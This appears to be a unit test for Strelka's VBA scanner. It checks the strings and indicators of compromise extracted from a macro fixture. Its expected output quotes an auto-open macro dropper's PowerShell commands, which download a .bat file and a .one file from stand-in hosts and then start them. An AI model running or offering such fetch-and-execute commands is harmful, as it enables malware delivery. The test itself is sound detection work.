from pathlib import Path
from unittest import TestCase, mock

from pytest_unordered import unordered

from strelka.scanners.scan_vb import ScanVb as ScanUnderTest
from strelka.tests import run_test_scan


def test_scan_vb(mocker):
    """
    Pass: Sample event matches output of scanner.
    Failure: Unable to load file or sample event fails to match.
    """
    test_scan_event = {
        "elapsed": mock.ANY,
        "flags": [],
        "comments": ["AutoOpen Macro"],
        "functions": ["AutoOpen", "Document_Open", "Testing_Iocs"],
        "names": [
            "Explicit",
            "MsgBox",
            "objWMIService",
            "GetObject",
            "objStartup",
            "Get",
            "objConfig",
            "SpawnInstance_",
            "ShowWindow",
            "objProcess",
            "ExecuteCmdAsync",
        ],
        "operators": ["="],
        "strings": [
            "Hello World!",
            "winmgmts:\\\\\\\\.\\\\root\\\\cimv2",
            "Win32_ProcessStartup",
            "winmgmts:\\\\\\\\.\\\\root\\\\cimv2:Win32_Process",
            "cmd /c powershell Invoke-WebRequest -Uri https://www.test.example.com -OutFile $env:tmp\\\\test.txt\\nStart-Process -Filepath $env:tmp\\\\invoice.one",
            "cmd /c powershell Invoke-WebRequest -Uri https://www.test.com/test.bat -OutFile $env:tmp\\\\test.bat\\nStart-Process -Filepath $env:tmp\\\\test.bat",
        ],
        "script_length_bytes": 752,
        "tokens": [
            "Token.Keyword",
            "Token.Name",
            "Token.Text.Whitespace",
            "Token.Name.Function",
            "Token.Punctuation",
            "Token.Comment",
            "Token.Literal.String",
            "Token.Operator",
            "Token.Literal.Number.Integer",
        ],
        "urls": unordered(
            [
                "tmp\\\\invoice.one",
                "https://www.test.com/test.bat",
                "https://www.test.example.com",
            ]
        ),
        "iocs": unordered(
            [
                {
                    "ioc": "www.test.example.com",
                    "ioc_type": "domain",
                    "scanner": "ScanVb",
                },
                {
                    "ioc": "https://www.test.example.com",
                    "ioc_type": "url",
                    "scanner": "ScanVb",
                },
                {"ioc": "www.test.com", "ioc_type": "domain", "scanner": "ScanVb"},
                {
                    "ioc": "https://www.test.com/test.bat",
                    "ioc_type": "url",
                    "scanner": "ScanVb",
                },
            ]
        ),
    }

    scanner_event = run_test_scan(
        mocker=mocker,
        scan_class=ScanUnderTest,
        fixture_path=Path(__file__).parent / "fixtures/test.vba",
    )

    TestCase.maxDiff = None
    TestCase().assertDictEqual(test_scan_event, scanner_event)
